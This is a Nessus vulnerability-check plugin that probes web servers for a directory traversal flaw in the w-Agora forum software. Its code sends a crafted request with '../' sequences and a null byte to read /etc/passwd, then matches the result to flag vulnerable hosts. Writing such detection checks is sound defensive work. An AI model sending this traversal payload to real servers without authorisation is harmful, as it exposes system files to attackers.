#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(15437);
  script_version("$Revision: 1.9 $");

  script_bugtraq_id(6595);
  script_osvdb_id(3012, 54099);
 
  script_name(english:"w-Agora Multiple Script Traversal Arbitrary File Access");
  script_set_attribute(
    attribute:"synopsis",
    value:
"A web forum on the remote host has a directory traversal
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running w-agora, a web-based forum application
written in PHP.

The remote version of this software is prone to directory traversal
attacks.  A remote attacker could send specially crafted URL to read
arbitrary files from the remote system with the privileges of the web
server process."
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to the latest version of this software."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/10/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/01/11");
 script_cvs_date("$Date: 2011/11/28 21:39:47 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes(); 

  script_summary(english:"Checks for directory traversal in w-Agora");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1");
 req = http_get(item:req, port:port);
 result = http_keepalive_send_recv(port:port, data:req);
 if(result == NULL) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
}
